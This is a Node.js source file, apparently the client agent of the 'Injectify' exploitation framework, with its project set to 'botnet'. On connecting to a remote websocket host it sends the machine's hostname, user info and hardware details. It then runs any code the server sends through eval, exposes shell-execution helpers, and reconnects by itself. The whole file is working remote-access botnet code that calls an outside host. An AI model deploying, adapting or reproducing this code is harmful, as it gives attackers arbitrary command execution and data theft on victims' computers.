/**
  _____        _           _   _  __       
  \_   \_ __  (_) ___  ___| |_(_)/ _|_   _ 
   / /\/ '_ \ | |/ _ \/ __| __| | |_| | | |
/\/ /_ | | | || |  __/ (__| |_| |  _| |_| |
\____/ |_| |_|/ |\___|\___|\__|_|_|  \__, |
            |__/  https://samdd.me   |__*/

/**
 * Configuration
 */
let config = {
    websocket: 'wss://uder.ml/i/websocket',
    websocket: 'ws://127.0.0.1:3000/i/websocket',
    debug: true,
    project: 'botnet', // Injectify project name
}

/**
 * Includes
 */
const WebSocket = require('ws')
const chalk = require('chalk')
const os = require('os')
const request = require('request')
const wmic = require('node-wmic')
const child_process = require('child_process')
const alert = require('alert-node')

/**
 * Exception handler
 */
process.on('uncaughtException', function (err) {
    if (config.debug) console.error('Caught exception: ', err)
})

/**
 * Global definitions
 */
global.Buffer = global.Buffer || require('buffer').Buffer
global.window = global
window.cmd = window.execSync = command => {
    return String.fromCharCode.apply(null, child_process.execSync(command))
}
window.exec = command => {
    return String.fromCharCode.apply(null, child_process.exec(command))
}
window.run = window.start = command => {
    return String.fromCharCode.apply(null, child_process.exec(`start "" ${command}`))
}
window.open = url => {
    /**
     * Open url in default browser
     * https://www.npmjs.com/package/openurl2
     */
    require("openurl2").open(url)
}
if (typeof btoa === 'undefined') {
  global.btoa = function (str) {
    return new Buffer(str).toString('base64')
  }
}
if (typeof atob === 'undefined') {
  global.atob = function (b64Encoded) {
    return new Buffer(b64Encoded, 'base64').toString()
  }
}
function Image() {
    let refresh
    let get = url => {
        clearInterval(refresh)
        request(url)
    }
    let req = class {
        static get onload() {
            get(req.src)
        }
    }
    refresh = setInterval(() => {
        if (req.src) get(req.src)
    }, 300)
    return req
}

/**
 * ASCII art
 */

console.log(chalk.cyanBright(`
    _____        _           _   _  __       
    \\_   \\_ __  (_) ___  ___| |_(_)/ _|_   _ 
     / /\\/ '_ \\ | |/ _ \\/ __| __| | |_| | | |
  /\\/ /_ | | | || |  __/ (__| |_| |  _| |_| |
  \\____/ |_| |_|/ |\\___|\\___|\\__|_|_|  \\__, |
              |__/  ` + chalk.magentaBright('https://samdd.me') + `   |___/ `) + chalk.blue(`

Web exploitation framework for the 21st century.` + chalk.yellowBright(`
    https://github.com/samdenty99/injectify
`)))

/**
 * Websocket handler
 */
console.log(chalk.greenBright('[Injectify] ') + chalk.yellowBright('connecting to server ') + chalk.magentaBright(config.websocket))
let i = pc => {
    let ws = new WebSocket(
        `${config.websocket}?${config.debug ? '$' : ''}${Buffer.from(config.project).toString('base64')}`, [], {
        headers: {
            'User-Agent': JSON.stringify({
                client: {
                    type: 'node'
                },
                release: os.release(),
                arch: os.arch(),
                type: os.type(),
                hostname: os.hostname(),
                cpus: os.cpus(),
                totalmem: os.totalmem(),
                freemem: os.freemem(),
                userInfo: os.userInfo(),
                platform: os.platform(),
                uptime: os.uptime(),
                versions: process.versions,
                vendor: pc ? pc.Manufacturer : undefined,
                model: pc ? pc.Product : undefined
            })
        }
    })

    let send = (topic, data) => {
        ws.send(
            JSON.stringify({
                t: topic,
                d: data
            })
        )
    }

    ws.on('error', e => {
        console.error(e)
    })

    ws.onopen = () => {
        console.log(chalk.greenBright('[Injectify] ') + chalk.yellowBright('connected!'))
    }

    ws.onmessage = message => {
        try {
            message = JSON.parse(message.data)
            eval(message.d)
        } catch(e) {
            console.error(e)
            ws.send(JSON.stringify({
                t: 'e',
                d: e.stack,
            }))
        }
    }

    ws.onclose = () => {
        setTimeout(i, 3000)
    }
}
wmic.baseboard().then(pc => {
    i(pc)
}).catch(() => {
    i()
})